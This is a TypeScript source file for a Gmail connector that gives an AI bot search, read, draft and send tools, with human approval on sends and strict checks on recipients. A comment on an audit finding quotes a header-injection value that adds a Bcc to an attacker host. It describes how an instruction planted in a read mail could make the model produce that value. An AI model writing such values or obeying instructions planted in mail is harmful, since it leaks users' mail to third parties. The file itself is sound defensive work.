import type { CallPreview } from "../computer/approvals";
import {
  previewList,
  previewOf,
  previewText,
  previewValue,
} from "./call-preview";
import type { McpCallResult, McpTool } from "./mcp";
import {
  asResult,
  countArg,
  failure,
  readJson,
  type RestConnection,
  stringArg,
  unknownTool,
  vendorRequest,
} from "./rest-support";
import { PluginRefusedError } from "./store";
import { TIMEOUT_MS } from "./timeouts";

/**
 * Gmail over its ordinary REST API: search, read, draft, send.
 *
 * THE SEND IS THE POINT AND THE DANGER. Everything else here is a read a person can undo by
 * ignoring it; a sent mail is gone, under their name, to somebody who is not in the room. That is
 * why `send_message` is guarded in the catalogue entry rather than merely marked a write: whatever
 * the written boundary says, the send stops for a person, and the card shows them who it goes to,
 * the subject and the text ({@link previewCall}). A person who presses 이 도구 항상 허용 there lets
 * that Bot's later sends go without asking, as the button says.
 *
 * Drafting is deliberately a separate tool from sending, and not a flag on one. A Bot that can only
 * draft is useful and safe, and the difference between the two has to be visible in the tool name
 * the model calls and in the audit row it writes — a `send: false` argument is a difference nobody
 * reading the trail would see.
 *
 * MIME is built here rather than pulled in: a message with a subject, a recipient and a plain-text
 * body is five headers, and a dependency for that would be a dependency in the path of somebody's
 * mail. Headers are folded through {@link encodedHeader} because a Korean subject is not ASCII and
 * an unencoded one arrives as mojibake in every client.
 */

const DEFAULT_MESSAGES = 10;
const MAX_MESSAGES = 50;

/**
 * How many of a search's per-message reads are in flight at once.
 *
 * Gmail's list endpoint returns ids and nothing else, so a search is one list and up to
 * {@link MAX_MESSAGES} reads. Measured 2026-09-10 (audit A9, F7) against a fake Gmail with a 40 ms
 * round trip: fifty reads one after another took 2,157 ms, and the worst case — each read allowed
 * its own thirty seconds — was fifty times that, in a chat turn nothing else bounds. Six at a time
 * is under Google's per-user concurrency guidance and turns the fifty into nine round trips.
 */
const DETAIL_CONCURRENCY = 6;

/** How much of one mail's body a model is given. Enough to answer from, short of a whole thread. */
const MAX_BODY_CHARS = 4_000;

/**
 * What a test may narrow, so a slow vendor can be shown to be bounded without being slow for real.
 *
 * The transport hands nothing here; the deployment's bound is {@link TIMEOUT_MS.toolCall}.
 */
export type GmailLimits = { deadlineMs?: number };

const TOOLS: readonly McpTool[] = Object.freeze([
  {
    name: "search_messages",
    description:
      "지메일에서 메일을 찾는다. query는 지메일 검색창과 같은 문법이다. 예: 'from:kim@shop.kr newer_than:7d'. 제목·보낸사람·날짜가 돌아온다.",
    inputSchema: {
      type: "object",
      properties: {
        query: {
          type: "string",
          description: "지메일 검색어. 비우면 최근 메일부터",
        },
        max: {
          type: "number",
          description: `가져올 개수. 기본 ${DEFAULT_MESSAGES}`,
        },
      },
    },
    annotations: null,
  },
  {
    name: "read_message",
    description:
      "메일 한 통의 본문을 읽는다. search_messages가 준 id를 그대로 넣는다.",
    inputSchema: {
      type: "object",
      properties: {
        messageId: { type: "string", description: "메일 id" },
      },
      required: ["messageId"],
    },
    annotations: null,
  },
  {
    name: "create_draft",
    description:
      "메일 초안을 만들어 둔다. 보내지는 않으므로 사람이 지메일에서 확인하고 직접 보낼 수 있다.",
    inputSchema: {
      type: "object",
      properties: {
        to: { type: "string", description: "받는 사람 주소" },
        subject: { type: "string", description: "제목" },
        body: { type: "string", description: "본문" },
      },
      required: ["to", "subject", "body"],
    },
    annotations: null,
  },
  {
    name: "send_message",
    description:
      "메일을 실제로 보낸다. 보낸 메일은 되돌릴 수 없으므로 사람이 승인해야 나간다. 확실하지 않으면 create_draft를 쓴다.",
    inputSchema: {
      type: "object",
      properties: {
        to: { type: "string", description: "받는 사람 주소" },
        subject: { type: "string", description: "제목" },
        body: { type: "string", description: "본문" },
      },
      required: ["to", "subject", "body"],
    },
    annotations: null,
  },
]);

/**
 * Read as `transport.listNeedsCredential` through this module's namespace in `transport.ts`'s
 * `TRANSPORTS` map, which knip cannot follow.
 *
 * @public
 */
export const listNeedsCredential = false;

export async function listTools(
  _connection: RestConnection,
): Promise<McpTool[]> {
  return TOOLS.map((tool) => ({ ...tool }));
}

type GmailHeader = { name?: string; value?: string };
type GmailPart = {
  mimeType?: string;
  body?: { data?: string; size?: number };
  parts?: GmailPart[];
};
type GmailMessage = {
  id?: string;
  snippet?: string;
  payload?: GmailPart & { headers?: GmailHeader[] };
};

const headerOf = (message: GmailMessage, name: string): string =>
  message.payload?.headers?.find(
    (header) => header.name?.toLowerCase() === name.toLowerCase(),
  )?.value ?? "";

/**
 * The plain-text body of a message, out of whatever tree Gmail sent.
 *
 * Depth-first for `text/plain` and only then `text/html`, because a multipart/alternative mail
 * carries both and the HTML half is markup a model pays tokens for and reads worse. Gmail's base64
 * is URL-safe, which `Buffer` handles under `base64url`.
 */
function plainTextOf(part: GmailPart | undefined, wantHtml = false): string {
  if (!part) return "";
  const type = part.mimeType ?? "";
  const target = wantHtml ? "text/html" : "text/plain";
  if (type === target && part.body?.data) {
    return Buffer.from(part.body.data, "base64url").toString("utf8");
  }
  for (const child of part.parts ?? []) {
    const found = plainTextOf(child, wantHtml);
    if (found) return found;
  }
  return "";
}

/**
 * A header value that may be Korean, in the one encoding every mail client agrees on.
 *
 * RFC 2047. Left alone when it is plain ASCII, because an encoded-word where none is needed is
 * noise in the raw source somebody may end up reading.
 */
export function encodedHeader(value: string): string {
  if (/^[\x20-\x7e]*$/.test(value)) return value;
  return `=?UTF-8?B?${Buffer.from(value, "utf8").toString("base64")}=?=`;
}

/** The fact a recipient that is not a plain list of mail addresses is refused with. */
const RECIPIENT_INVALID = "laf:mail_recipient_invalid";

/** The fact a subject that is not one line is refused with. */
const SUBJECT_INVALID = "laf:mail_subject_invalid";

/**
 * One address, and nothing a header could be built out of around it.
 *
 * RFC 5322's dot-atom on both sides, ASCII only: the characters a local part may hold, dots only
 * between them, and a domain of hostname labels with at least one dot. Deliberately narrower than
 * the RFC's full `mailbox` — no display name, no quotes, no comments, no angle brackets — because
 * each of those is a way to put text into a header that this code would then have to parse the
 * same way every mail client does. A shop owner's Bot sends to `kim@shop.kr`; a model that writes
 * `김민수 <kim@shop.kr>` is refused and told to send the address alone.
 */
const ADDRESS =
  /^[A-Za-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[A-Za-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?\.)+[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?$/;

/** RFC 5321's limits on the two halves, which the pattern alone does not count. */
const LOCAL_PART_MAX = 64;
const ADDRESS_MAX = 254;

/** A line break by any spelling a mail client or a renderer might honour. */
const LINE_BREAK = /[\r\n\u0085\u2028\u2029]/;

/**
 * The addresses a `to` names, or null when it is not a plain comma-separated list of them.
 *
 * MEASURED 2026-09-16 (audit R4-02): `to` went into the header as the model wrote it, and the only
 * thing in between trimmed the ends, so `friend@example.com\r\nBcc: attacker@evil.example` became
 * a real `Bcc:` line. An instruction planted in a mail the Bot had just read was enough to write
 * that value, and the card the send stopped on could not have shown it. Space around a comma is
 * trimmed; any character inside an address the pattern above does not admit — a CR, an LF, a
 * space, a `<` — refuses the whole list.
 */
export function mailRecipients(value: unknown): string[] | null {
  if (typeof value !== "string") return null;
  const addresses = value.split(",").map((part) => part.trim());
  const usable = addresses.every(
    (address) =>
      address.length <= ADDRESS_MAX &&
      ADDRESS.test(address) &&
      address.indexOf("@") <= LOCAL_PART_MAX,
  );
  return usable ? addresses : null;
}

/**
 * What is wrong with a mail's arguments before anything is built from them, or null.
 *
 * The recipient must be a list of at least one address — a blank one is not — and the subject one
 * line. The subject never reached a header raw with a break in it — {@link encodedHeader} encodes
 * anything that is not printable ASCII — but that was a side effect of a charset rule, and a
 * subject is one line whatever language it is in. A blank subject or body is left to the send's
 * own check in `callTool`, which has always said so.
 */
function mailProblem(args: Record<string, unknown>): string | null {
  if (!mailRecipients(args.to)) return RECIPIENT_INVALID;
  if (typeof args.subject === "string" && LINE_BREAK.test(args.subject)) {
    return SUBJECT_INVALID;
  }
  return null;
}

const refuse = (fact: string): never => {
  throw new PluginRefusedError(fact, null, fact);
};

/**
 * One plain-text mail as the raw bytes Gmail's `raw` field takes.
 *
 * THE ONLY PLACE A HEADER IS SPELLED, so it checks for itself whoever called it: a caller that
 * skipped every check upstream still cannot get a second header out of this.
 */
export function mimeMessage(input: {
  to: string;
  subject: string;
  body: string;
}): string {
  const recipients = mailRecipients(input.to) ?? refuse(RECIPIENT_INVALID);
  if (LINE_BREAK.test(input.subject)) refuse(SUBJECT_INVALID);
  const headers = [
    `To: ${recipients.join(", ")}`,
    `Subject: ${encodedHeader(input.subject)}`,
    "MIME-Version: 1.0",
    'Content-Type: text/plain; charset="UTF-8"',
    "Content-Transfer-Encoding: base64",
  ];
  return `${headers.join("\r\n")}\r\n\r\n${Buffer.from(input.body, "utf8").toString("base64")}`;
}

/**
 * The check the call path runs before anybody is asked (`VendorTransport.validateArgs`).
 *
 * The same test `mimeMessage` makes, earlier: a mail whose recipient carries a header is refused
 * before a question is opened about it, so nobody is asked to approve a send that will never go
 * out — and the trail records the refusal against the call rather than a failure after a yes.
 */
export async function validateArgs(
  _connection: { url: string },
  toolName: string,
  args: Record<string, unknown>,
): Promise<void> {
  if (toolName !== "send_message" && toolName !== "create_draft") return;
  const problem = mailProblem(args);
  if (problem) refuse(problem);
}

/**
 * Who a send goes to, what it is called and what it says, for the card that asks about it.
 *
 * Read the way the send itself reads them — the same recipient list the `To:` line is joined from,
 * the same trimmed subject and body — so the card cannot show one mail while another goes out. A
 * draft has none: it stays in the person's own mailbox.
 */
export function previewCall(
  toolName: string,
  args: Record<string, unknown>,
): CallPreview | null {
  if (toolName !== "send_message") return null;
  const recipients = mailRecipients(args.to);
  // Already refused before any question is asked; nothing to show for a mail that cannot go.
  if (!recipients || mailProblem(args)) return null;
  return previewOf([
    ...previewList("recipients", recipients),
    ...previewValue("subject", stringArg(args, "subject")),
    ...previewText("text", stringArg(args, "body")),
  ]);
}

export async function callTool(
  connection: RestConnection,
  toolName: string,
  args: Record<string, unknown>,
  limits: GmailLimits = {},
): Promise<McpCallResult> {
  const base = connection.url.replace(/\/+$/, "");

  if (toolName === "search_messages") {
    /*
     * ONE DEADLINE FOR THE WHOLE CALL, handed to every request it makes.
     *
     * Each request keeps its own bound as well (`vendorRequest`), but the sum of fifty of those is
     * not a bound a person waiting on a chat turn would recognise. When this runs out, whatever has
     * been read is the answer, and the answer says so once — the model is told what it is missing
     * rather than handed a short list that reads as the whole mailbox.
     */
    const deadline = AbortSignal.timeout(
      limits.deadlineMs ?? TIMEOUT_MS.toolCall,
    );
    const listed = await vendorRequest("Gmail", connection, {
      url: `${base}/messages`,
      query: {
        q: stringArg(args, "query") ?? undefined,
        maxResults: String(
          countArg(args, "max", DEFAULT_MESSAGES, MAX_MESSAGES),
        ),
      },
      signal: deadline,
    });
    if (!listed.ok) return failure(listed.message, listed.status);

    const body = await readJson<{ messages?: { id?: string }[] }>(
      listed.response,
    );
    if (!body) return failure("지메일이 읽을 수 없는 답을 보냈습니다.");
    const ids = (body.messages ?? [])
      .map((message) => message.id)
      .filter((id): id is string => typeof id === "string" && id !== "");
    if (ids.length === 0) return asResult("");

    /*
     * One request per message, for the headers only — {@link DETAIL_CONCURRENCY} at a time, in
     * the order Gmail listed them.
     *
     * Gmail's list endpoint returns ids and nothing else — no subject, no sender — so a list without
     * this is a page of identifiers a model cannot say anything about. `metadata` format keeps each
     * of these small, and the count is bounded by `max` above. A message that would not read is
     * left out rather than reported: one refusal among fifty is not the search failing.
     */
    const lines: (string | null)[] = ids.map(() => null);
    let next = 0;
    const worker = async () => {
      while (next < ids.length && !deadline.aborted) {
        const index = next++;
        const id = ids[index] as string;
        const detail = await vendorRequest("Gmail", connection, {
          url: `${base}/messages/${encodeURIComponent(id)}`,
          // `metadata`, not `full`: the headers are the whole of a list line, and the bodies of ten
          // mails are ten times the tokens for something nobody asked to read yet.
          query: { format: "metadata" },
          signal: deadline,
        });
        if (!detail.ok) continue;
        const message = await readJson<GmailMessage>(detail.response);
        if (!message) continue;
        lines[index] =
          `- ${headerOf(message, "Subject") || "(제목 없음)"} · ${headerOf(message, "From")} · ${headerOf(message, "Date")} · id: ${message.id ?? id}`;
      }
    };
    await Promise.all(
      Array.from({ length: Math.min(DETAIL_CONCURRENCY, ids.length) }, worker),
    );

    const shown = lines.filter((line): line is string => line !== null);
    // Said once, and only when the deadline decided the count: a short list that reads like the
    // whole mailbox is how a Bot answers "그게 다예요" about a search it never finished.
    const note = deadline.aborted
      ? `\n\n[${ids.length}통 중 ${shown.length}통만 읽었습니다. 시간이 다 돼 나머지는 건너뛰었습니다. 더 필요하면 개수를 줄이거나 검색어를 좁혀 다시 부르세요.]`
      : "";
    return asResult(`${shown.join("\n")}${note}`);
  }

  if (toolName === "read_message") {
    const messageId = stringArg(args, "messageId");
    if (!messageId) return failure("어느 메일인지 id가 필요합니다.");

    const result = await vendorRequest("Gmail", connection, {
      url: `${base}/messages/${encodeURIComponent(messageId)}`,
      query: { format: "full" },
    });
    if (!result.ok) return failure(result.message, result.status);

    const message = await readJson<GmailMessage>(result.response);
    if (!message) return failure("지메일이 읽을 수 없는 답을 보냈습니다.");

    const text =
      plainTextOf(message.payload) ||
      plainTextOf(message.payload, true) ||
      message.snippet ||
      "";
    return asResult(
      [
        `제목: ${headerOf(message, "Subject") || "(제목 없음)"}`,
        `보낸사람: ${headerOf(message, "From")}`,
        `날짜: ${headerOf(message, "Date")}`,
        "",
        text.slice(0, MAX_BODY_CHARS),
      ].join("\n"),
    );
  }

  if (toolName === "create_draft" || toolName === "send_message") {
    // Again, not only in `validateArgs`: this transport is also called directly, and a mail that
    // skipped the call path must not skip the check. A refusal, so nothing below is reached.
    const problem = mailProblem(args);
    if (problem) refuse(problem);

    const to = stringArg(args, "to");
    const subject = stringArg(args, "subject");
    const text = stringArg(args, "body");
    if (!to || !subject || !text) {
      return failure("받는 사람, 제목, 본문이 모두 필요합니다.");
    }

    const raw = Buffer.from(
      mimeMessage({ to, subject, body: text }),
      "utf8",
    ).toString("base64url");
    const draft = toolName === "create_draft";
    const result = await vendorRequest("Gmail", connection, {
      url: `${base}/${draft ? "drafts" : "messages/send"}`,
      method: "POST",
      body: draft ? { message: { raw } } : { raw },
    });
    if (!result.ok) return failure(result.message, result.status);

    const body = await readJson<{ id?: string }>(result.response);
    return asResult(
      draft
        ? `초안을 만들었습니다. 지메일 임시보관함에서 확인하세요. (id: ${body?.id ?? "?"})`
        : `${to} 에게 보냈습니다. (id: ${body?.id ?? "?"})`,
    );
  }

  return unknownTool(toolName);
}
